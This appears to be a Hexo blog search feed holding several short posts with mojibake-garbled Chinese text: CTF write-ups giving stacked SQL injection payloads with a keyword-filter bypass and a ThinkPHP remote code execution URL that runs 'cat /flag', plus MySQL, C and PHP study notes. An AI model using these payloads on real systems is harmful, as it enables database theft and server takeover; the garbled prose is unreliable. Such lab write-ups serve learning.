        <content type="html"><![CDATA[<p>ç‚¹å‡»æäº¤æŸ¥è¯¢å‘çŽ°å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´ž</p><p>è¾“å…¥1â€™å‘çŽ°ä¸å›žæ˜¾ï¼Œç„¶åŽ1â€™ #æ˜¾ç¤ºæ­£å¸¸ï¼Œåº”è¯¥æ˜¯å­˜åœ¨sqlæ³¨å…¥äº†</p><p>order by 2çš„æ—¶å€™æ˜¯æ­£å¸¸å›žæ˜¾äº†ï¼Œorder by 3å°±å‡ºé”™äº†</p><p>![order by 3æŠ¥é”™](D:\blog\source_posts\XCTFï¼šWeb-supersqli\order by 3æŠ¥é”™.png)</p><p>åˆ¤æ–­åªæœ‰2ä¸ªå­—æ®µï¼Œè¿™æ—¶å€™ç”¨?inject=1 union select 1,2#è¿›è¡Œè”åˆæŸ¥è¯¢ï¼Œå‘çŽ°å…³é”®å­—è¢«æ­£åˆ™è¿‡æ»¤</p><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTFï¼šWeb-supersqli\è¢«è¿‡æ»¤.png" alt="è¢«è¿‡æ»¤"></p><p>é‡‡ç”¨å †å æ³¨å…¥ï¼š</p><pre><code>-1';show tables --+</code></pre><p>![-1â€™;show tables â€“+](D:\blog\source_posts\XCTFï¼šWeb-supersqli-1â€™;show tables â€“+.png)</p><pre><code>-1';show columns from `1919810931114514` --+</code></pre><p>![-1â€™;show columns from <code>1919810931114514</code> â€“+](D:\blog\source_posts\XCTFï¼šWeb-supersqli-1â€™;show columns from <code>1919810931114514</code> â€“+.png)</p><pre><code>-1';show columns from words --+</code></pre><p>![-1â€™;show columns from words â€“+](D:\blog\source_posts\XCTFï¼šWeb-supersqli-1â€™;show columns from words â€“+.png)</p><pre><code>-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#</code></pre><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTFï¼šWeb-supersqli\1.png" alt="1"></p><p>strstræ˜¯éžå¸¸ä¸å®‰å…¨çš„å‡½æ•°</p><p>å¤§å†™ç»•è¿‡</p><pre><code>-1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#</code></pre><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTFï¼šWeb-supersqli\flag.png" alt="flag"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-php_rce</title>
      <link href="2021/03/15/xctf-web-php-rce/"/>
      <url>2021/03/15/xctf-web-php-rce/</url>
      
        <content type="html"><![CDATA[<pre><code>http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL:å¢žåˆ æ”¹æŸ¥</title>
      <link href="2020/12/08/mysql-zeng-shan-gai-cha/"/>
      <url>2020/12/08/mysql-zeng-shan-gai-cha/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQLæŸ¥è¯¢è¯­å¥ï¼š"><a href="#MySQLæŸ¥è¯¢è¯­å¥ï¼š" class="headerlink" title="MySQLæŸ¥è¯¢è¯­å¥ï¼š"></a>MySQLæŸ¥è¯¢è¯­å¥ï¼š</h3><p>ã€€<strong>(1ï¼‰å¢žåŠ </strong></p><p>insert into table_name (column1, column2, column3, â€¦) values (value1, value2, value3, â€¦);<br>insert into table_name values (value1, value2, value3, â€¦);ã€€</p><p><strong>ï¼ˆ2ï¼‰åˆ é™¤</strong></p><p>åˆ é™¤æ•°æ®ï¼š</p><ul><li>delete from è¡¨å; </li><li>delete from è¡¨å where id=1; </li></ul><p>åˆ é™¤ç»“æž„ï¼š </p><ul><li>åˆ æ•°æ®åº“ï¼šdrop database æ•°æ®åº“å; </li><li>åˆ é™¤è¡¨ï¼šdrop table è¡¨å; </li><li>åˆ é™¤è¡¨ä¸­çš„åˆ—ï¼šalter table è¡¨å drop column åˆ—å; </li></ul><p><strong>ï¼ˆ3ï¼‰ä¿®æ”¹</strong></p><p>ä¿®æ”¹æ‰€æœ‰ï¼šupdate è¡¨å set åˆ—å=â€™æ–°çš„å€¼ï¼Œéžæ•°å­—åŠ å•å¼•å·â€™ ; </p><p>å¸¦æ¡ä»¶çš„ä¿®æ”¹ï¼šupdate è¡¨å set åˆ—å=â€™æ–°çš„å€¼ï¼Œéžæ•°å­—åŠ å•å¼•å·â€™ where id=6; </p><p>ç®€å•ä¸¾ä¾‹ï¼šupdate users set username=â€™ttâ€™ where id=16;</p><p>æŸ¥åº“ï¼š</p><pre><code>select schema_name from information_schema.schemata;</code></pre><p>ã€€ã€€æŸ¥è¡¨ï¼š</p><pre><code>select table_name from information_schema.tables where table_schema='security';</code></pre><p>ï¼ˆä»¥securityè¡¨ä¸ºä¾‹ï¼‰</p><p>ã€€ã€€æŸ¥åˆ—ï¼š</p><pre><code>select column_name from information_schema.columns where table_name='users';</code></pre><p>ã€€ã€€æŸ¥å­—æ®µï¼š</p><pre><code>select username,password from security.users;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šå˜é‡çš„ç”Ÿå­˜æœŸå’Œå­˜å‚¨ç±»åž‹</title>
      <link href="2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/"/>
      <url>2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€å˜é‡çš„ç”Ÿå­˜æœŸ</p><p>Cç¨‹åºå ç”¨çš„å­˜å‚¨ç©ºé—´å¯ä»¥åˆ†ä¸ºç¨‹åºåŒºã€é™æ€å­˜å‚¨åŒºã€åŠ¨æ€å­˜å‚¨åŒº3ä¸ªéƒ¨åˆ†</p><p>ç¨‹åºåŒºç”¨äºŽå­˜æ”¾ç¨‹åºï¼›é™æ€å­˜å‚¨åŒºæ˜¯åœ¨ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶å°±åˆ†é…çš„å›ºå®šå­˜å‚¨å•å…ƒï¼Œå¦‚å…¨å±€å˜é‡ï¼›åŠ¨æ€å­˜å‚¨åŒºæ˜¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡Œåˆ†é…çš„å­˜å‚¨å•å…ƒï¼Œå¦‚å‡½æ•°å½¢å‚ã€è‡ªåŠ¨å˜é‡ã€å‡½æ•°è°ƒç”¨æ—¶çš„çŽ°åœºä¿æŠ¤å’Œè¿”å›žåœ°å€ç­‰ã€‚</p><p>å­˜æ”¾åœ¨é™æ€å­˜å‚¨åŒºçš„å˜é‡ï¼Œå…¶ç”Ÿå­˜æœŸä»Žç¨‹åºè¿è¡Œå¼€å§‹ä¸€ç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸï¼›å­˜æ”¾åœ¨åŠ¨æ€å­˜å‚¨åŒºå’Œå¯„å­˜å™¨çš„å˜é‡ï¼Œå…¶ç”Ÿå­˜æœŸä»Žå˜é‡å®šä¹‰å¼€å§‹åˆ°å‡½æ•°è¿è¡Œç»“æŸä¸ºæ­¢ã€‚å®šä¹‰æ—¶å¯ä»¥ä½¿ç”¨autoï¼Œstaticï¼Œregisterï¼Œexternç­‰å…³é”®å­—æ¥è¯´æ˜Žå˜é‡çš„å­˜å‚¨ç±»åž‹ã€‚</p><p>äºŒã€å±€éƒ¨å˜é‡çš„å­˜å‚¨ç±»åž‹</p><p>(1)è‡ªåŠ¨å˜é‡</p><p>autoï¼Œå­˜æ”¾äºŽåŠ¨æ€å­˜å‚¨åŒºï¼Œå‡½æ•°æ‰§è¡Œç»“æŸï¼Œå ç”¨çš„å­˜å‚¨ç©ºé—´ç«‹å³é‡Šæ”¾ï¼Œä½œç”¨åŸŸæ˜¯å…¶æ‰€åœ¨çš„å‡½æ•°ã€‚</p><p>(2)é™æ€å˜é‡</p><p>staticï¼Œè¿è¡ŒæœŸé—´å ç”¨å­˜å‚¨ç©ºé—´ä¸é‡Šæ”¾ï¼Œä¸‹æ¬¡å†è°ƒç”¨å‡½æ•°æ—¶ï¼Œå˜é‡çš„å€¼å°±æ˜¯è¯¥å‡½æ•°ä¸Šæ¬¡è°ƒç”¨åŽçš„å€¼ï¼Œå®šä¹‰é™æ€å˜é‡æ—¶ä¸èµ‹åˆå€¼ï¼Œç¼–è¯‘ç³»ç»Ÿè‡ªåŠ¨èµ‹å€¼ï¼ˆæ•°å€¼å˜é‡0ï¼Œå­—ç¬¦å˜é‡ç©ºå­—ç¬¦ï¼‰ã€‚</p><p>(3)å¯„å­˜å™¨å˜é‡</p><p>registerï¼Œè®¿é—®å¯„å­˜å™¨ä¸­çš„å˜é‡æ¯”è®¿é—®å†…å­˜å¿«ï¼Œç”Ÿå­˜å‘¨æœŸä¸Žè‡ªåŠ¨å˜é‡ç›¸åŒï¼Œå¯„å­˜å™¨å˜é‡åªèƒ½æ˜¯å­—ç¬¦åž‹å˜é‡ï¼Œæ•´å½¢å˜é‡å’ŒæŒ‡é’ˆç±»åž‹çš„å˜é‡ã€‚</p><p>ä¸‰ã€å…¨å±€å˜é‡çš„å‚¨å­˜ç±»åž‹</p><p>(4)å¤–éƒ¨å˜é‡</p><p>externï¼Œå¤–éƒ¨å˜é‡æ˜¯å®šä¹‰åœ¨å‡½æ•°å¤–çš„å…¨å±€å˜é‡ï¼Œå­˜æ”¾åœ¨é™æ€å­˜å‚¨åŒºä¸­ï¼Œå…¶ç”Ÿå­˜æœŸå­˜åœ¨äºŽç¨‹åºçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ï¼›ä½œç”¨åŸŸä»Žå®šä¹‰å¼€å§‹è‡³ç¨‹åºæœ«å°¾ï¼›</p><p>(5)é™æ€å…¨å±€å˜é‡</p><p>staticï¼Œé™æ€å…¨å±€å˜é‡çš„ä½œç”¨åŸŸé™åˆ¶åœ¨å®šä¹‰è¯¥å˜é‡çš„æºæ–‡ä»¶å†…ï¼Œå…¶ä»–æºæ–‡ä»¶ä¸èƒ½ä½¿ç”¨å®ƒã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP:ä»‹ç»</title>
      <link href="2020/10/01/php-jie-shao/"/>
      <url>2020/10/01/php-jie-shao/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP æ˜¯ä»€ä¹ˆï¼Ÿ"></a>PHP æ˜¯ä»€ä¹ˆï¼Ÿ</h2><ul><li>PHPï¼ˆå…¨ç§°ï¼šPHPï¼šHypertext Preprocessorï¼Œå³â€PHPï¼šè¶…æ–‡æœ¬é¢„å¤„ç†å™¨â€ï¼‰æ˜¯ä¸€ç§é€šç”¨å¼€æºè„šæœ¬è¯­è¨€ã€‚</li><li>PHP è„šæœ¬åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</li><li>PHP å¯å…è´¹ä¸‹è½½ä½¿ç”¨ã€‚</li></ul><h2 id="PHP-æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ"></a>PHP æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ</h2><ul><li>PHP æ–‡ä»¶å¯åŒ…å«æ–‡æœ¬ã€HTMLã€JavaScriptä»£ç å’Œ PHP ä»£ç </li><li>PHP ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æžœä»¥çº¯ HTML å½¢å¼è¿”å›žç»™æµè§ˆå™¨</li><li>PHP æ–‡ä»¶çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åæ˜¯ â€œ.phpâ€</li></ul><h2 id="ä¸ºä»€ä¹ˆä½¿ç”¨-PHPï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨-PHPï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ PHPï¼Ÿ"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ PHPï¼Ÿ</h2><ul><li>PHP å¯åœ¨ä¸åŒçš„å¹³å°ä¸Šè¿è¡Œï¼ˆWindowsã€Linuxã€Unixã€Mac OS X ç­‰ï¼‰</li><li>PHP ä¸Žç›®å‰å‡ ä¹Žæ‰€æœ‰çš„æ­£åœ¨è¢«ä½¿ç”¨çš„æœåŠ¡å™¨ç›¸å…¼å®¹ï¼ˆApacheã€IIS ç­‰ï¼‰</li><li>PHP æä¾›äº†å¹¿æ³›çš„æ•°æ®åº“æ”¯æŒ</li><li>PHP æ˜¯å…è´¹çš„ï¼Œå¯ä»Žå®˜æ–¹çš„ PHP èµ„æºä¸‹è½½å®ƒï¼š<a href="http://www.php.net/"> www.php.net</a></li><li>PHP æ˜“äºŽå­¦ä¹ ï¼Œå¹¶å¯é«˜æ•ˆåœ°è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢æ›´æ–°ä¸‰æ­¥</title>
      <link href="2020/10/01/bo-ke-geng-xin-san-bu/"/>
      <url>2020/10/01/bo-ke-geng-xin-san-bu/</url>
      
        <content type="html"><![CDATA[<ol><li>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹ hexo new post â€œæ–‡ç« æ ‡é¢˜â€</li><li>hexo g</li><li>hexo d</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
